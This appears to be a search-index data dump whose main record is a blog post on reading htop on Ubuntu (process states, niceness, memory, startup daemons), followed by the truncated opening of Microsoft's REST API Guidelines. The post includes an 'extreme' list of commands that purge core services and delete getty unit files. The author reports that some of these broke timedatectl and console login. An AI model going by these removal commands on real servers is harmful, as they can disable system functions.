pts/1 Z+ 0:00 \\_ [zombie] <defunct> 1317 pts/0 Ss 0:00 -bash 7913 pts/0 R+ 0:00 \\_ ps f We got our zombie! When the parent process is done, the zombie is gone. $ ps f PID TTY STAT TIME COMMAND 3514 pts/1 Ss+ 0:00 -bash 1317 pts/0 Ss 0:00 -bash 7914 pts/0 R+ 0:00 \\_ ps f If you replaced sleep(20) with while (true) ; then the zombie would be gone right away. With exit, all of the memory and resources associated with it are deallocated so they can be used by other processes. Why keep the zombie processes around then? The parent process has the option to find out its child process exit code (in a signal handler) with the wait system call. If a process is sleeping, then it needs to wait for it to wake up. Why not simply forcefully wake it up and kill it? For the same reason, you don't toss your child in the trash when you're tired of it. Bad things could happen. T - stopped by job control signalI have opened two terminal windows and I can look at my user's processes with ps u. $ ps u USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND ubuntu 1317 0.0 0.9 21420 4992 pts/0 Ss+ Jun07 0:00 -bash ubuntu 3514 1.5 1.0 21420 5196 pts/1 Ss 07:28 0:00 -bash ubuntu 3528 0.0 0.6 36084 3316 pts/1 R+ 07:28 0:00 ps u I will omit the -bash and ps u processes from the output below. Now run cat /dev/urandom > /dev/null in one terminal window. Its state is R+ which means that it is running. $ ps u USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND ubuntu 3540 103 0.1 6168 688 pts/1 R+ 07:29 0:04 cat /dev/urandom Press CTRL+Z to stop the process. $ # CTRL+Z [1]+ Stopped cat /dev/urandom > /dev/null $ ps aux USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND ubuntu 3540 86.8 0.1 6168 688 pts/1 T 07:29 0:15 cat /dev/urandom Its state is now T. Run fg in the first terminal to resume it. Another way to stop a process like this is to send the STOP signal with kill to the process. To resume the execution of the process, you can use the CONT signal. t - stopped by debugger during the tracingFirst, install the GNU Debugger (gdb) sudo apt install -y gdb Run a program that will listen for incoming network connections on port 1234. $ nc -l 1234 & [1] 3905 It is sleeping meaning it is waiting for data from the network. $ ps u USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND ubuntu 3905 0.0 0.1 9184 896 pts/0 S 07:41 0:00 nc -l 1234 Run the debugger and attach it to the process with ID 3905. sudo gdb -p 3905 You will see that the state is t which means that this process is being traced in the debugger. $ ps u USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND ubuntu 3905 0.0 0.1 9184 896 pts/0 t 07:41 0:00 nc -l 1234 Process timeLinux is a multitasking operating system which means that even when you have a single CPU, you can run several processes at the same time. You can connect to your server via SSH and look at the output of htop while your web server is delivering the content of your blog to your readers over the internet. How is that possible when a single CPU can only execute one instruction at a time? The answer is time sharing. One process runs for a bit of time, then it is suspended while the other processes waiting to run take turns running for a while. The bit of time a process runs is called the time slice. The time slice is usually a few milliseconds so you don't really notice it that much when your system is not under high load. (It'd be really interesting to find out how long time slices usually are in Linux.) This should help explain why the load average is the average number of running processes. If you have just one core and the load average is 1.0, the CPU has been utilized at 100%. If the load average is higher than 1.0, it means that the number of processes wanting to run is higher than the CPU can run so you may experience slow downs or delays. If the load is lower than 1.0, it means the CPU is sometimes idleing and not doing anything. This should also give you a clue why sometimes the running time of a process that's been running for 10 seconds is higher or lower than exactly 10 seconds. Process niceness and priorityWhen you have more tasks to run than the number of available CPU cores, you somehow have to decide which tasks to run next and which ones to keep waiting. This is what the task scheduler is responsible for. The scheduler in the Linux kernel is reponsible for choosing which process on a run queue to pick next and it depends on the scheduler algorithm used in the kernel. You can't generally influence the scheduler but you can let it know which processes are more important to you and the scheduler may take it into account. Niceness (NI) is user-space priority to processes, ranging from -20 which is the highest priority to 19 which is the lowest priority. It can be confusing but you can think that a nice process yields to a less nice process. So the nicer a process is, the more it yields. From what I've pieced together by reading StackOverflow and other sites, a niceness level increase by 1 should yield a 10% more CPU time to the process. The priority (PRI) is the kernel-space priority that the Linux kernel is using. Priorities range from 0 to 139 and the range from 0 to 99 is real time and 100 to 139 for users. You can change the nicesness and the kernel takes it into account but you cannot change the priority. The relation between the nice value and priority is: PR = 20 + NI so the value of PR = 20 + (-20 to +19) is 0 to 39 that maps 100 to 139. You can set the niceness of a process before launching it. nice -n niceness program Change the nicencess when a program is already running with renice. renice -n niceness -p PID Here is what the CPU usage colors mean: Blue: Low priority threads (nice > 0) Green: Normal priority threads Red: Kernel threads http://askubuntu.com/questions/656771/process-niceness-vs-priority Memory usage - VIRT/RES/SHR/MEMA process has the illusion of being the only one in memory. This is accomplished by using virtual memory. A process does not have direct access to the physical memory. Instead, it has its own virtual address space and the kernel translates the virtual memory addresses to physical memory or can map some of it to disk. This is why it can look like processes use more memory than you have installed on your computer. The point I want to make here is that it is not very straightforward to figure out how much memory a process takes up. Do you also want to count the shared libraries or disk mapped memory? But the kernel provides and htop shows some information that can help you estimate memory usage. Here is what the memory usage colors mean: Green: Used memory Blue: Buffers Orange: Cache VIRT/VSZ - Virtual Image The total amount of virtual memory used by the task. It includes all code, data and shared libraries plus pages that have been swapped out and pages that have been mapped but not used. VIRT is virtual memory usage. It includes everything, including memory mapped files. If an application requests 1 GB of memory but uses only 1 MB, then VIRT will report 1 GB. If it mmaps a 1 GB file and never uses it, VIRT will also report 1 GB. Most of the time, this is not a useful number. The non-swapped physical memory a task has used. RES is resident memory usage i.e. what's currently in the physical memory. While RES can be a better indicator of how much memory a process is using than VIRT, keep in mind that this does not include the swapped out memory some of the memory may be shared with other processes If a process uses 1 GB of memory and it calls fork(), the result of forking will be two processes whose RES is both 1 GB but only 1 GB will actually be used since Linux uses copy-on-write. SHR - Shared Mem size The amount of shared memory used by a task. It simply reflects memory that could be potentially shared with other processes. #include <stdio.h> #include <stdlib.h> #include <unistd.h> int main() { printf(\"Started\\n\"); sleep(10); size_t memory = 10 * 1024 * 1024; // 10 MB char* buffer = malloc(memory); printf(\"Allocated 10M\\n\"); sleep(10); for (size_t i = 0; i < memory/2; i++) buffer[i] = 42; printf(\"Used 5M\\n\"); sleep(10); int pid = fork(); printf(\"Forked\\n\"); sleep(10); if (pid != 0) { for (size_t i = memory/2; i < memory/2 + memory/5; i++) buffer[i] = 42; printf(\"Child used extra 2M\\n\"); } sleep(10); return 0; } fallocate -l 10G gcc -std=c99 mem.c -o mem ./mem Process Message VIRT RES SHR main Started 4200 680 604 main Allocated 10M 14444 680 604 main Used 5M 14444 6168 1116 main Forked 14444 6168 1116 child Forked 14444 5216 0 main Child used extra 2M 8252 1116 child Child used extra 2M 5216 0 TODO: I should finish this. MEM% - Memory usage A task's currently used share of available physical memory. This is RES divided by the total RAM you have. If RES is 400M and you have 8 gigabytes of RAM, MEM% will be 400/8192*100 = 4.88%. ProcessesLet's take a look at the process list in the htop screenshot. Do you actually need them? Here are my research notes on the processes that are run at startup on a fresh Digital Ocean droplet with Ubuntu Server 16.04.1 LTS x64. Before /sbin/init The /sbin/init program (also called init) coordinates the rest of the boot process and configures the environment for the user. When the init command starts, it becomes the parent or grandparent of all of the processes that start up automatically on the system. Is it systemd? $ dpkg -S /sbin/init systemd-sysv: /sbin/init Yes, it is. What happens if you kill it? Nothing. https://wiki.ubuntu.com/SystemdForUpstartUsers https://www.centos.org/docs/5/html/5.1/Installation_Guide/s2-boot-init-shutdown-init.html /lib/systemd/systemd-journald systemd-journald is a system service that collects and stores logging data. It creates and maintains structured, indexed journals based on logging information that is received from a variety of sources. In other words: One of the main changes in journald was to replace simple plain text log files with a special file format optimized for log messages. This file format allows system administrators to access relevant messages more efficiently. It also brings some of the power of database-driven centralized logging implementations to individual systems. You are supposed to use the journalctl command to query log files. journalctl _COMM=sshd logs by sshd journalctl _COMM=sshd -o json-pretty logs by sshd in JSON journalctl --since \"2015-01-10\" --until \"2015-01-11 03:00\" journalctl --since 09:00 --until \"1 hour ago\" journalctl --since yesterday journalctl -b logs since boot journalctl -f to follow logs journalctl --disk-usage journalctl --vacuum-size=1G Pretty cool. It looks like it is not possible to remove or disable this service, you can only turn off logging. https://www.freedesktop.org/software/systemd/man/systemd-journald.service.html https://www.digitalocean.com/community/tutorials/how-to-use-journalctl-to-view-and-manipulate-systemd-logs https://www.loggly.com/blog/why-journald/ https://ask.fedoraproject.org/en/question/63985/how-to-correctly-disable-journald/ /sbin/lvmetad -f The lvmetad daemon caches LVM metadata, so that LVM commands can read metadata without scanning disks. Metadata caching can be an advantage because scanning disks is time consuming and may interfere with the normal work of the system and disks. But what is LVM (Logical Volume Management)? You can think of LVM as \"dynamic partitions\", meaning that you can create/resize/delete LVM \"partitions\" (they're called \"Logical Volumes\" in LVM-speak) from the command line while your Linux system is running: no need to reboot the system to make the kernel aware of the newly-created or resized partitions. It sounds like you should keep it if you are using LVM. $ lvscan $ sudo apt remove lvm2 -y --purge http://manpages.ubuntu.com/manpages/xenial/man8/lvmetad.8.html http://askubuntu.com/questions/3596/what-is-lvm-and-what-is-it-used-for /lib/systemd/udevd systemd-udevd listens to kernel uevents. For every event, systemd-udevd executes matching instructions specified in udev rules. udev is a device manager for the Linux kernel. As the successor of devfsd and hotplug, udev primarily manages device nodes in the /dev directory. So this service manages /dev. I am not sure if I need it running on a virtual server. https://www.freedesktop.org/software/systemd/man/systemd-udevd.service.html https://wiki.archlinux.org/index.php/udev /lib/systemd/timesyncd systemd-timesyncd is a system service that may be used to synchronize the local system clock with a remote Network Time Protocol server. So this replaces ntpd. $ timedatectl status Local time: Fri 2016-08-26 11:38:21 UTC Universal time: Fri 2016-08-26 11:38:21 UTC RTC time: Fri 2016-08-26 11:38:20 Time zone: Etc/UTC (UTC, +0000) Network time on: yes NTP synchronized: yes RTC in local TZ: no If we take a look at the open ports on this server: $ sudo netstat -nlput Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 2178/sshd tcp6 0 0 :::22 :::* LISTEN 2178/sshd Lovely! Previously on Ubuntu 14.04 it was $ sudo apt-get install ntp -y $ sudo netstat -nlput Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1380/sshd tcp6 0 0 :::22 :::* LISTEN 1380/sshd udp 0 0 10.19.0.6:123 0.0.0.0:* 2377/ntpd udp 0 0 139.59.256.256:123 0.0.0.0:* 2377/ntpd udp 0 0 127.0.0.1:123 0.0.0.0:* 2377/ntpd udp 0 0 0.0.0.0:123 0.0.0.0:* 2377/ntpd udp6 0 0 fe80::601:6aff:fxxx:123 :::* 2377/ntpd udp6 0 0 ::1:123 :::* 2377/ntpd udp6 0 0 :::123 :::* 2377/ntpd Ugh. https://www.freedesktop.org/software/systemd/man/systemd-timesyncd.service.html https://wiki.archlinux.org/index.php/systemd-timesyncd /usr/sbin/atd -f atd - run jobs queued for later execution. atd runs jobs queued by at. at and batch read commands from standard input or a specified file which are to be executed at a later time Unlike cron, which schedules jobs that are repeated periodically, at runs a job at a specific time once. $ echo \"touch /tmp/yolo.txt\" | at now + 1 minute job 1 at Fri Aug 26 10:44:00 2016 $ atq 1 Fri Aug 26 10:44:00 2016 a root $ sleep 60 && ls /tmp/yolo.txt /tmp/yolo.txt I've actually never used it until now. sudo apt remove at -y --purge http://manpages.ubuntu.com/manpages/xenial/man8/atd.8.html http://manpages.ubuntu.com/manpages/xenial/man1/at.1.html http://askubuntu.com/questions/162439/why-does-ubuntu-server-run-both-cron-and-atd /usr/lib/snapd/snapd Snappy Ubuntu Core is a new rendition of Ubuntu with transactional updates - a minimal server image with the same libraries as todays Ubuntu, but applications are provided through a simpler mechanism. What? Developers from multiple Linux distributions and companies today announced collaboration on the snap universal Linux package format, enabling a single binary package to work perfectly and securely on any Linux desktop, server, cloud or device. Apparently it is a simplified deb package and you're supposted to bundle all dependencies in a single snap that you can distribute. I've never used snappy to deploy or distribute applications on servers. sudo apt remove snapd -y --purge https://developer.ubuntu.com/en/snappy/ https://insights.ubuntu.com/2016/06/14/universal-snap-packages-launch-on-multiple-linux-distros/ /usr/bin/dbus-daemon In computing, D-Bus or DBus is an inter-process communication (IPC) and remote procedure call (RPC) mechanism that allows communication between multiple computer programs (that is, processes) concurrently running on the same machine My understanding is that you need it for desktop environments but on a server to run web apps? sudo apt remove dbus -y --purge I wonder what time it is and whether it is being synchronized with NTP? $ timedatectl status Failed to create bus connection: No such file or directory Oops. Should probably keep this. https://en.wikipedia.org/wiki/D-Bus /lib/systemd/systemd-logind systemd-logind is a system service that manages user logins. https://www.freedesktop.org/software/systemd/man/systemd-logind.service.html /usr/sbin/cron -f cron - daemon to execute scheduled commands (Vixie Cron) -f Stay in foreground mode, don't daemonize. You can schedule tasks to run periodically with cron. Use crontab -e to edit the configuration for your user or on Ubuntu I tend to use the /etc/cron.hourly, /etc/cron.daily, etc. directories. You can see the log files with grep cron /var/log/syslog or journalctl _COMM=cron or even journalctl _COMM=cron --since=\"date\" --until=\"date\" You'll probably want to keep cron. But if you don't, then you should stop and disable the service: sudo systemctl stop cron sudo systemctl disable cron Because otherwise when trying to remove it with apt remove cron it will try to install postfix! $ sudo apt remove cron The following packages will be REMOVED: cron The following NEW packages will be installed: anacron bcron bcron-run fgetty libbg1 libbg1-doc postfix runit ssl-cert ucspi-unix It looks like cron needs a mail transport agent (MTA) to send emails. $ apt show cron Package: cron Version: 3.0pl1-128ubuntu2 ... Suggests: anacron (>= 2.0-1), logrotate, checksecurity, exim4 | postfix | mail-transport-agent $ apt depends cron cron ... Suggests: anacron (>= 2.0-1) Suggests: logrotate Suggests: checksecurity |Suggests: exim4 |Suggests: postfix Suggests: <mail-transport-agent> ... exim4-daemon-heavy postfix https://help.ubuntu.com/community/CronHowto https://www.digitalocean.com/community/tutorials/how-to-use-cron-to-automate-tasks-on-a-vps http://unix.stackexchange.com/questions/212355/where-is-my-logfile-of-crontab /usr/sbin/rsyslogd -n Rsyslogd is a system utility providing support for message logging. In another words, it's what populates log files in /var/log/ like /var/log/auth.log for authentication messages like SSH login attempts. The configuration files are in /etc/rsyslog.d. You can also configure rsyslogd to send log files to a remote server and implement centralized logging. You can use the logger command to log messages to /var/log/syslog in background scripts such as those that are run at boot. #!/bin/bash logger Starting doing something # NFS, get IPs, etc. logger Done doing something Right, but we already have systemd-journald running. Do we need rsyslogd as well? Rsyslog and Journal, the two logging applications present on your system, have several distinctive features that make them suitable for specific use cases. In many situations it is useful to combine their capabilities, for example to create structured messages and store them in a file database. A communication interface needed for this cooperation is provided by input and output modules on the side of Rsyslog and by the Journal's communication socket. So, maybe? I am going to keep it just in case. http://manpages.ubuntu.com/manpages/xenial/man8/rsyslogd.8.html http://manpages.ubuntu.com/manpages/xenial/man1/logger.1.html https://wiki.archlinux.org/index.php/rsyslog https://www.digitalocean.com/community/tutorials/how-to-centralize-logs-with-rsyslog-logstash-and-elasticsearch-on-ubuntu-14-04 https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/7/html/System_Administrators_Guide/s1-interaction_of_rsyslog_and_journal.html /usr/sbin/acpid acpid - Advanced Configuration and Power Interface event daemon acpid is designed to notify user-space programs of ACPI events. acpid should be started during the system boot, and will run as a background process, by default. In computing, the Advanced Configuration and Power Interface (ACPI) specification provides an open standard that operating systems can use to perform discovery and configuration of computer hardware components, to perform power management by, for example, putting unused components to sleep, and to do status monitoring. But I'm on a virtual server that I don't intend to suspend/resume. I am going to remove it for fun and see what happens. sudo apt remove acpid -y --purge I was able to successfully reboot the droplet but after halt Digital Ocean thought it was still on so I had to Power Off using the web interface. So I should probably keep this. http://manpages.ubuntu.com/manpages/xenial/man8/acpid.8.html https://en.wikipedia.org/wiki/Advanced_Configuration_and_Power_Interface /usr/bin/lxcfs /var/lib/lxcfs/ Lxcfs is a fuse filesystem mainly designed for use by lxc containers. On a Ubuntu 15.04 system, it will be used by default to provide two things: first, a virtualized view of some /proc files; and secondly, filtered access to the hosts cgroup filesystems. In summary, on a 15.04 host, you can now create a container the usual way, lxc-create ... The resulting container will have correct results for uptime, top, etc. Its basically a userspace workaround to changes which were deemed unreasonable to do in the kernel. It makes containers feel much more like separate systems than they would without it. Not using LXC containers? You can remove it with sudo apt remove lxcfs -y --purge https://insights.ubuntu.com/2015/03/02/introducing-lxcfs/ https://www.stgraber.org/2016/03/31/lxcfs-2-0-has-been-released/ /usr/lib/accountservice/accounts-daemon The AccountsService package provides a set of D-Bus interfaces for querying and manipulating user account information and an implementation of these interfaces based on the usermod(8), useradd(8) and userdel(8) commands. When I removed DBus it broke timedatectl, I wonder what removing this service will break. sudo apt remove accountsservice -y --purge Time will tell. http://www.linuxfromscratch.org/blfs/view/systemd/gnome/accountsservice.html /sbin/mdadm mdadm is a Linux utility used to manage and monitor software RAID devices. The name is derived from the md (multiple device) device nodes it administers or manages, and it replaced a previous utility mdctl. The original name was \"Mirror Disk\", but was changed as the functionality increased. RAID is a method of using multiple hard drives to act as one. There are two purposes of RAID: 1) Expand drive capacity: RAID 0. If you have 2 x 500 GB HDD then total space become 1 TB. 2) Prevent data loss in case of drive failure: For example RAID 1, RAID 5, RAID 6, and RAID 10. You can remove it with sudo apt remove mdadm -y --purge https://en.wikipedia.org/wiki/Mdadm https://help.ubuntu.com/community/Installation/SoftwareRAID http://manpages.ubuntu.com/manpages/xenial/man8/mdadm.8.html /usr/lib/policykit-1/polkitd --no-debug polkitd PolicyKit daemon polkit - Authorization Framework My understanding is that this is like fine-grained sudo. You can allow non privilegded users to do certain actions as root. For instance, reboot your computer when you're running Linux on a desktop computer. But I'm running a server. You can remove it with sudo apt remove policykit-1 -y --purge Still wondering if this breaks something. http://manpages.ubuntu.com/manpages/xenial/man8/polkitd.8.html http://manpages.ubuntu.com/manpages/xenial/man8/polkit.8.html http://www.admin-magazine.com/Articles/Assigning-Privileges-with-sudo-and-PolicyKit https://wiki.archlinux.org/index.php/Polkit#Configuration /usr/sbin/sshd -D sshd (OpenSSH Daemon) is the daemon program for ssh. -D When this option is specified, sshd will not detach and does not become a daemon. This allows easy monitoring of sshd. http://manpages.ubuntu.com/manpages/xenial/man8/sshd.8.html /sbin/iscsidiscsid is the daemon (system service) that runs in the background, acting on iSCSI configuration, and managing the connections. From its manpage: The iscsid implements the control path of iSCSI protocol, plus some management facilities. For example, the daemon could be configured to automatically re-start discovery at startup, based on the contents of persistent iSCSI database. http://unix.stackexchange.com/questions/216239/iscsi-vs-iscsid-services I had never heard of iSCSI: In computing, iSCSI (Listeni/askzi/ eye-skuz-ee) is an acronym for Internet Small Computer Systems Interface, an Internet Protocol (IP)-based storage networking standard for linking data storage facilities. By carrying SCSI commands over IP networks, iSCSI is used to facilitate data transfers over intranets and to manage storage over long distances. iSCSI can be used to transmit data over local area networks (LANs), wide area networks (WANs), or the Internet and can enable location-independent data storage and retrieval. The protocol allows clients (called initiators) to send SCSI commands (CDBs) to SCSI storage devices (targets) on remote servers. It is a storage area network (SAN) protocol, allowing organizations to consolidate storage into data center storage arrays while providing hosts (such as database and web servers) with the illusion of locally attached disks. You can remove it with sudo apt remove open-iscsi -y --purge /sbin/agetty --noclear tty1 linux agetty - alternative Linux getty getty, short for \"get tty\", is a Unix program running on a host computer that manages physical or virtual terminals (TTYs). When it detects a connection, it prompts for a username and runs the 'login' program to authenticate the user. Originally, on traditional Unix systems, getty handled connections to serial terminals (often Teletype machines) connected to a host computer. The tty part of the name stands for Teletype, but has come to mean any type of text terminal. This allows you to log in when you are physically at the server. In Digital Ocean, you can click on Console in the droplet details and you will be able to interact with this terminal in your browser (it's a VNC connection I think). In the old days, you'd see a bunch of ttys started a system boot (configured in /etc/inittab), but nowadays they are spun up on demand by systemd. For fun, I removed this configuration file that launches and generates agetty: sudo rm /etc/systemd/system/getty.target.wants/[emailprotected] sudo rm /lib/systemd/system/getty@.service When I rebooted the server, I could still connect to it via SSH but I was no longer able to log in from the Digital Ocean web console. http://manpages.ubuntu.com/manpages/xenial/man8/getty.8.html https://en.wikipedia.org/wiki/Getty_(Unix) http://0pointer.de/blog/projects/serial-console.html http://unix.stackexchange.com/questions/56531/how-to-get-fewer-ttys-with-systemd sshd: [emailprotected]/0 means that there has been an SSH session established for the user root at the #0 pseudoterminal (pts). A pseudoterminal emulates a real text terminal. bash is the shell that I am using. Why is there a dash at the beginning? Reddit user hirnbrot helpfully explained it: There's a dash at the beginning because launching it as \"-bash\" will make it a login shell. A login shell is one whose first character of argument zero is a -, or one started with the --login option. This will then cause it to read a different set of configuration files. htop is an interactive process viewer tool that is running in the screenshot. Aftersudo apt remove lvm2 -y --purge sudo apt remove at -y --purge sudo apt remove snapd -y --purge sudo apt remove lxcfs -y --purge sudo apt remove mdadm -y --purge sudo apt remove open-iscsi -y --purge sudo apt remove accountsservice -y --purge sudo apt remove policykit-1 -y --purge Extreme edition: sudo apt remove dbus -y --purge sudo apt remove rsyslog -y --purge sudo apt remove acpid -y --purge sudo systemctl stop cron && sudo systemctl disable cron sudo rm /etc/systemd/system/getty.target.wants/[emailprotected] sudo rm /lib/systemd/system/getty@.service I followed the instructions in my blog post about unattended installation of WordPress on Ubuntu Server and it works. Here's nginx, PHP7 and MySQL. AppendixSource codeSometimes looking at strace is not enough. Another way to figure out what a program does is to look at its source code. First, I need to find out where to start looking. $ which uptime /usr/bin/uptime $ dpkg -S /usr/bin/uptime procps: /usr/bin/uptime Here we find out that uptime is actually located at /usr/bin/uptime and that on Ubuntu it is part of the procps package. You can then go to packages.ubuntu.com and search for the package there. Here is the page for procps: http://packages.ubuntu.com/source/xenial/procps If you scroll to the bottom of the page, you'll see links to the source code repositories: Debian Package Source Repository git://git.debian.org/collab-maint/procps.git Debian Package Source Repository (Browsable) https://anonscm.debian.org/cgit/collab-maint/procps.git/ File descriptors and redirectionWhen you want to redirect standard error (stderr) to standard output (stdout), is it 2&>1 or 2>&1? You can memorize where the ampersand & goes by knowing that echo something > file will write something to the file file. It's the same as echo something 1> file. Now, echo something 2> file will write the stderr output to file. If you write echo something 2>1, it means that you redirect stderr to a file with the name 1. Add spaces to make it more clear: echo something 2> 1. If you add & before 1, it means that 1 is not a filename but the stream ID. So it's echo something 2>&1. Colors in PuTTY If you have missing elements in htop when you are using PuTTY, here is how to solve it. Right click on the title bar Click Change settings... Go to Window -> Colours Select the Both radio button Click Apply Shell in CLet's write a very simple shell in C that demonstrates the use of fork/exec/wait system calls. Here's the program shell.c. #include <stdio.h> #include <stdlib.h> #include <unistd.h> #include <string.h> #include <sys/wait.h> int main() { printf(\"Welcome to my shell\\n\"); char line[1024]; while (1) { printf(\"> \"); fgets(line, sizeof(line), stdin); line[strlen(line)-1] = '\\0'; // strip \\n if (strcmp(line, \"exit\") == 0) // shell built-in break; int pid = fork(); if (pid == 0) { printf(\"Executing: %s\\n\", line); if (execlp(line, \"\", NULL) == -1) { printf(\"ERROR!\\n\"); exit(1); } } else if (pid > 0) { int status; waitpid(pid, &status, 0); printf(\"Child exited with %d\\n\", WEXITSTATUS(status)); } else { printf(\"ERROR!\\n\"); break; } } return 0; } Compile the program. gcc shell.c -o shell And run it. $ ./shell Welcome to my shell > date Executing: date Thu Dec 1 14:10:59 UTC 2016 Child exited with 0 > true Executing: true Child exited with 0 > false Executing: false Child exited with 1 > exit Have you ever wondered that when you launch a process in the background you only see that it has exited only after a while when you hit Enter? $ sleep 1 & [1] 11686 $ # press Enter [1]+ Done sleep 1 That's because the shell is waiting for your input. Only when you enter a command does it check for the status of the background processes and show if they've been terminated. TODOHere is what I'd like to find out more about. process state substatuses (Ss, Ss+, R+, etc.) kernel threads /dev/pts more about memory (CODE, DATA, SWAP) figure out time slices length Linux scheduler algorithm pinning proceses to cores write about manual pages cpu/memory colors in bars process ID limit & fork bomb lsof, ionice, schedtool UpdatesHere is a list of non-minor corrections and updates since the post was published. Idle time in /proc/uptime is the sum of all cores (Dec 2, 2016) My parent/child printf in zombie.c was reversed (Dec 2, 2016) apt remove cron installs postfix because of a dependency to an MTA (Dec 3, 2016) id can load information from other sources (via /etc/nsswitch.conf), not just /etc/passwd (Dec 3, 2016) Describe /etc/shadow password hash format (Dec 3, 2016) Use visudo to edit the /etc/sudoers file to be safe (Dec 3, 2016) Explain MEM% (Dec 3, 2016) Rewrite the section about load averages (Dec 4, 2016) Fix: kill 1234 by default sends TERM not INT (Dec 7, 2016) Explain CPU and memory color bars (Dec 7, 2016) Please let me know if there is something wrong in this post! I will gladly correct it. T-shirtCongratulations on making to the end. Here's another screenshot of htop. This time it's of a human. It displays your inner processes and the load of your kernel. Get this t-shirt for yourself or as a gift. It's been bought 44 times already (including hoodies, etc.) ",
        "_version_": 1718527433697656832
      },
      {
        "story_id": [21609807],
        "story_author": ["excerionsforte"],
        "story_descendants": [161],
        "story_score": [419],
        "story_time": ["2019-11-22T20:39:05Z"],
        "story_title": "Microsoft REST API Guidelines",
        "search": [
          "Microsoft REST API Guidelines",
          "https://github.com/Microsoft/api-guidelines/blob/master/Guidelines.md",
          "Microsoft REST API Guidelines Microsoft REST API Guidelines Working Group Name Name Name Dave Campbell (CTO C+E) Rick Rashid (CTO ASG) John Shewchuk (Technical Fellow, TED HQ) Mark Russinovich (CTO Azure) Steve Lucco (Technical Fellow, DevDiv) Murali Krishnaprasad (Azure App Plat) Rob Howard (ASG) Peter Torr (OSG) Chris Mullins (ASG) Document editors: John Gossman (C+E), Chris Mullins (ASG), Gareth Jones (ASG), Rob Dolin (C+E), Mark Stafford (C+E) Microsoft REST API Guidelines 1 Abstract The Microsoft REST API Guidelines, as a design principle, encourages application developers to have resources accessible to them via a RESTful HTTP interface. To provide the smoothest possible experience for developers on platforms following the Microsoft REST API Guidelines, REST APIs SHOULD follow consistent design guidelines to make using them easy and intuitive. This document establishes the guidelines Microsoft REST APIs SHOULD follow so RESTful interfaces are developed consistently. 2 Table of contents Microsoft REST API Guidelines 2.3 Microsoft REST API Guidelines Working Group Microsoft REST API Guidelines 1 Abstract 2 Table of contents 3 Introduction 3.1 Recommended reading 4 Interpreting the guidelines 4.1 Application of the guidelines 4.2 Guidelines for existing services and versioning of services 4.3 Requirements language 4.4 License 5 Taxonomy 5.1 Errors 5.2 Faults 5.3 Latency 5.4 Time to complete 5.5 Long running API faults 6 Client guidance 6.1 Ignore rule 6.2 Variable order rule 6.3 Silent fail rule 7 Consistency fundamentals 7.1 URL structure 7.2 URL length 7.3 Canonical identifier 7.4 Supported methods 7.5 Standard request headers 7.6 Standard response headers 7.7 Custom headers 7.8 Specifying headers as query parameters 7.9 PII parameters 7.10 Response formats 7.11 HTTP Status Codes 7.12 Client library optional 8 CORS 8.1 Client guidance 8.2 Service guidance 9 Collections 9.1 Item keys 9.2 Serialization 9.3 Collection URL patterns 9.4 Big collections 9.5 Changing collections 9.6 Sorting collections 9.7 Filtering 9.8 Pagination 9.9 Compound collection operations 10 Delta queries 10.1 Delta links 10.2 Entity representation 10.3 Obtaining a delta link 10.4 Contents of a delta link response 10.5 Using a delta link 11 JSON standardizations 11.1 JSON formatting standardization for primitive types 11.2 Guidelines for dates and times 11.3 JSON serialization of dates and times 11.4 Durations 11.5 Intervals 11.6 Repeating intervals 12 Versioning 12.1 Versioning formats 12.2 When to version 12.3 Definition of a breaking change 13 Long running operations 13.1 Resource based long running operations (RELO) 13.2 Stepwise long running operations 13.3 Retention policy for operation results 14 Push notifications via webhooks 14.1 Scope 14.2 Principles 14.3 Types of subscriptions 14.4 Call sequences 14.5 Verifying subscriptions 14.6 Receiving notifications 14.7 Managing subscriptions programmatically 14.8 Security 15 Unsupported requests 15.1 Essential guidance 15.2 Feature allow list 16 Appendix 16.1 Sequence diagram notes 3 Introduction Developers access most Microsoft Cloud Platform resources via HTTP interfaces. Although each service typically provides language-specific frameworks to wrap their APIs, all of their operations eventually boil down to HTTP requests. Microsoft must support a wide range of clients and services and cannot rely on rich frameworks being available for every development environment. Thus a goal of these guidelines is to ensure Microsoft REST APIs can be easily and consistently consumed by any client with basic HTTP support. To provide the smoothest possible experience for developers, it's important to have these APIs follow consistent design guidelines, thus making using them easy and intuitive. This document establishes the guidelines to be followed by Microsoft REST API developers for developing such APIs consistently. The benefits of consistency accrue in aggregate as well; consistency allows teams to leverage common code, patterns, documentation and design decisions. These guidelines aim to achieve the following: Define consistent practices and patterns for all API endpoints across Microsoft. Adhere as closely as possible to accepted REST/HTTP best practices in the industry at-large.* Make accessing Microsoft Services via REST interfaces easy for all application developers. Allow service developers to leverage the prior work of other services to implement, test and document REST endpoints defined consistently. Allow for partners (e.g., non-Microsoft entities) to use these guidelines for their own REST endpoint design. Note: The guidelines are designed to align with building services which comply with the REST architectural style, though they do not address or require building services that follow the REST constraints. The term \"REST\" is used throughout this document to mean services that are in the spirit of REST rather than adhering to REST by the book. 3.1 Recommended reading Understanding the philosophy behind the REST Architectural Style is recommended for developing good HTTP-based services. If you are new to RESTful design, here are some good resources: REST on Wikipedia -- Overview of common definitions and core ideas behind REST. REST Dissertation -- The chapter on REST in Roy Fielding's dissertation on Network Architecture, \"Architectural Styles and the Design of Network-based Software Architectures\" RFC 7231 -- Defines the specification for HTTP/1.1 semantics, and is considered the authoritative resource. REST in Practice -- Book on the fundamentals of REST. 4 Interpreting the guidelines 4.1 Application of the guidelines These guidelines are applicable to any REST API exposed publicly by Microsoft or any partner service. Private or internal APIs SHOULD also try to follow these guidelines because internal services tend to eventually be exposed publicly. Consistency is valuable to not only external customers but also internal service consumers, and these guidelines offer best practices useful for any service. There are legitimate reasons for exemption from these guidelines. Obviously a REST service that implements or must interoperate with some externally defined REST API must be compatible with that API and not necessarily these guidelines. Some services MAY also have special performance needs that require a different format, such as a binary protocol. 4.2 Guidelines for existing services and versioning of services We do not recommend making a breaking change to a service that pre-dates these guidelines simply for compliance sake. The service SHOULD try to become compliant at the next version release when compatibility is being broken anyway. When a service adds a new API, that API SHOULD be consistent 